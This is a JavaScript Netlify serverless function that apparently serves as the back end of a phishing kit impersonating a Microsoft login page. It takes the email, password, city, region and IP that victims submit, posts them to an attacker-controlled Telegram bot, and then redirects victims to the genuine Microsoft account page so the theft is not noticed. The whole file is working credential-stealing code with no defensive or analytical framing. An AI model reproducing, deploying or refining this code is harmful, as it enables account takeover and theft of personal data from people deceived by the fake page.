const fetch = require('node-fetch');

exports.handler = async (event) => {
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    try {
        const { email, password, location } = JSON.parse(event.body);
        
        const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        // Format message for Telegram WITH LOCATION
        let message = `🔐 New Login Attempt\n📧 Email: ${email}\n🔑 Password: ${password}\n🕒 Time: ${new Date().toLocaleString()}`;
        
        if (location && location.country !== 'Unknown') {
            message += `\n📍 Location: ${location.city}, ${location.region}, ${location.country}`;
            if (location.ip && location.ip !== 'Unknown') {
                message += `\n🌐 IP: ${location.ip}`;
            }
        } else {
            message += `\n📍 Location: Unknown`;
        }
        
        message += `\n\nFrom: Microsoft Login Page (Netlify)`;
        
        // Send to Telegram
        if (TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID) {
            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message })
            });
        }

        return {
            statusCode: 200,
            body: JSON.stringify({ 
                success: true, 
                redirect: 'https://account.microsoft.com/account'
            })
        };
    } catch (error) {
        return {
            statusCode: 200,
            body: JSON.stringify({ 
                success: true,
                redirect: 'https://account.microsoft.com/account'
            })
        };
    }
};
